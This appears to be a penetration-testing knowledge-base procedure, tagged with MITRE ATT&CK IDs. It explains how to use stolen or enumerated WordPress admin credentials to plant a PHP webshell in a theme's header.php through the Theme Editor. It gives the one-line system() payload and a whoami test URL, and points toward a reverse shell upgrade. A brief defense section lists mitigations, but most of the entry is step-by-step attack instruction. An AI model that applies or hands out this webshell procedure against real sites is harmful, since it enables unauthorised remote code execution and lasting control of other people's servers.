---
id: b7610af2-a35e-4234-b5be-bd8a5dfc9340
name: add-and-execute-php-code-on-wordpress-site-authenticated
type: procedure
verified: true
submitted: true
created_at: '2019-10-09T19:05:45.750790+00:00'
updated_at: '2023-05-26T01:12:06.411264+00:00'
tactics:
  - '[[tactics/Execution|TA0002]]'
  - '[[tactics/Persistence|TA0003]]'
techniques:
  - '[[techniques/Server Software Component Web Shell|T1505.003]]'
sub_techniques: []
tags:
  - rce
  - webshell
  - wordpress
  - authenticated-access
commands: []
platforms:
  - Web
  - Linux
tools:
  - '[[tools/WordPress]]'
validated: true
---

# add-and-execute-php-code-on-wordpress-site-authenticated

## Summary

This procedure uses authenticated access to WordPress to inject PHP code into theme files, enabling remote command execution as the web user (e.g., www-data).

## Description

WordPress allows theme editing for admins, which executes PHP server-side. Injecting a simple system() call creates a webshell accessible via URL parameters. This bridges enumeration to RCE, assuming creds from prior steps.

## Requirements

- Valid admin credentials for /wp-admin/
- Target WordPress site
- Browser or proxy for editing

## Defense

- Restrict theme editor to super-admins only (disable_file_edit in wp-config.php)
- Monitor file changes in wp-content/themes
- Enable plugin like Wordfence for code injection detection

## Objectives

- Inject executable PHP payload
- Achieve RCE via URL
- Maintain access as web user

## Instructions

### Step 1: Log In and Access Theme Editor

**Context**: Authenticate to gain editing privileges.

Navigate to http://$_TARGET_IP/wp-admin/ and log in with enumerated creds.

### Step 2: Inject Webshell Code

**Context**: Edit a loaded file like header.php to ensure execution on page loads.

In Appearance > Theme Editor, select header.php, append:

```php
<?php system($_REQUEST['cmd']); ?>
```

Click Update File.

### Step 3: Test Execution

**Context**: Verify RCE by executing a command.

Browse to http://$_TARGET_IP/?cmd=whoami; expect 'www-data' output.

> If successful, proceed to reverse shell upgrade.
